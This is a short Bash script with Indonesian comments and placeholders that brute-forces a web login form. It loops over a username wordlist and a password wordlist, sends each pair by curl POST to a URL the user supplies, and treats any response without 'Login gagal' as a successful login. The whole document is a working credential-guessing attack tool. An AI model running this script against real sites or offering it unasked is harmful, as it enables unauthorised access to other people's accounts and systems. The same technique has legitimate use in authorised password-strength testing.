#!/bin/bash

URL="ISI URL DISINI"
USERLIST="FILE WORDLIST UNTUK USER"
PASSLIST="FILE WORDLIST UNTUK PASSWORD"

while read -r USER; do
  while read -r PASS; do
    echo "Mencoba: $USER / $PASS"

    RESPONSE=$(curl -s -X POST "$URL" \
      -d "username=$USER&password=$PASS")  # username dan password disesuaikan dengan name form yang ada di web

    # Deteksi login berhasil (sesuaikan dengan respon asli)
    if [[ "$RESPONSE" != *"Login gagal"* ]]; then
      echo " BERHASIL login dengan $USER / $PASS"
      exit 0
    fi
  done < "$PASSLIST"
done < "$USERLIST"

echo " Tidak ditemukan kombinasi yang cocok pada wordlist."
